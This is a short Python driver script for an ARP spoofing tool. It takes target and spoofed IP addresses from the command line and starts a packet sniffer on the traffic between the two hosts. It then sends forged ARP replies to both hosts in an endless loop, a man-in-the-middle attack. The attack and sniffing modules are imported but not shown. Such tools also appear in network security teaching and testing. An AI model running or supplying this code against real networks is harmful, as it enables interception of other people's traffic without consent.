import argparse
import threading
from arp_spoofer import send_arp_packet
from sniffer import sniff_packets
from utils import find_mac_addresses

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-I", dest="network_interface", required=True, help="Network interface name")
    parser.add_argument("-spoofip", dest="spoof_ip", required=True, help="IP address to spoof")
    parser.add_argument("-targetip", dest="target_ip", required=True, help="Target IP address")
    parser.add_argument("-mac", dest="your_mac", required=True, help="Your MAC address")
    parser.add_argument("-localip", dest="local_ip", required=True, help="Your local IP address")

    args = parser.parse_args()
    
    find_mac_addresses.find_mac(args.target_ip)
    find_mac_addresses.find_mac(args.spoof_ip)
    def start_sniffing(interface, target1_ip, target2_ip):
        sniff_packets(interface, args.target_ip, args.spoof_ip)

    sniffing_thread = threading.Thread(target=start_sniffing, args=(args.network_interface, args.target_ip, args.spoof_ip))

    try:
        sniffing_thread.start()

        while True:
            send_arp_packet(args.network_interface, args.target_ip, args.spoof_ip, args.your_mac)
            send_arp_packet(args.network_interface, args.spoof_ip, args.target_ip, args.your_mac)
    except KeyboardInterrupt:
        print("ARP Spoofing Stopped")
